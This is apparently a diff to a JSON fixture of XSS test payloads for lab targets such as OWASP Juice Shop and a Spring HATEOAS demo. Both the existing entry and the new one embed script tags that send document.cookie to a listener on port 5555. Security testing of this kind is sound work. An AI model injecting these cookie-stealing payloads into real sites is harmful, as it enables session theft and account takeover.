@@ -22,5 +22,19 @@
   "payloadJuiceShopXSS4" : {
     "comment": "XSS Payload payloadJuiceShopXSS4: <<script>alert(\"TestXSS\")</script>script>(new Image).src = 'http://0.0.0.0:5555/Cookie:' + document.cookie<</script>/script>",
     "rating": 0
+  },
+  "payload-Spring-hateoas-demo" : {
+    "id":"3",
+    "title":"Monotheist",
+    "artist": {
+      "id":"cfrost",
+      "name":"Celtic Frost <script>(new Image).src = 'http://0.0.0.0:5555/Cookie:' + document.cookie</script>" },
+    "stockLevel":0,
+    "_links": {
+      "self": {
+        "href":"http://localhost:10001/album/3" },
+      "artist": {
+        "href":"http://localhost:10001/artist/cfrost" }
+    }
   }
 }
